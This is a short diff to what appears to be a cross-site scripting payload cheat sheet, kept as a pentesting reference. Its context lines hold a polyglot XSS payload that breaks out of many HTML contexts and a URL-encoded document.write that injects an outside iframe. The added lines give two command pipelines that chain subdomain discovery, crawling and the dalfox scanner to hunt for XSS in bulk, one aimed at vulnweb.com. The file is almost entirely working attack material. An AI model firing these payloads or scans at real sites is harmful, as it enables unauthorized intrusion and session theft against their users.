@@ -8,6 +8,12 @@
 
 JavaScript://%250Aalert?.(1)//'/*\'/*"/*\"/*/*\/*%26apos;)/*<!--></Title/</Style/</Script/</textArea/</iFrame/</noScript>\74k<K/contentEditable/autoFocus/OnFocus=/*${/*/;{/**/(alert)(1)}//><Base/Href=//X55.is\76-->
 
+# Command line: (Ref https://www.linkedin.com/posts/steven-guimar%C3%A3es-29aa79212_bount-pentest-penetrationtesting-activity-7013963248324501504-kn5U?utm_source=share&utm_medium=member_desktop )
+XSS = cat sites.txt | subfinder -silent | httpx -silent | katana -silent | Gxss -c 100 | dalfox pipe --skip-bav --skip-mining-all --skip-grepping
+
+XSS = subfinder -d vulnweb.com -all -silent | httpx -silent | katana -silent | Gxss -c 100 | dalfox pipe --skip-bav --skip-mining-all --skip-grepping
+
+
 # Mario :v
 document.write%28%3Ciframe%20src%3D%22http%3A//supermarioemulator.com/Mario.php%22%20height%3D640%20width%3D%22816%22%3E%3C/iframe%3E%29
 
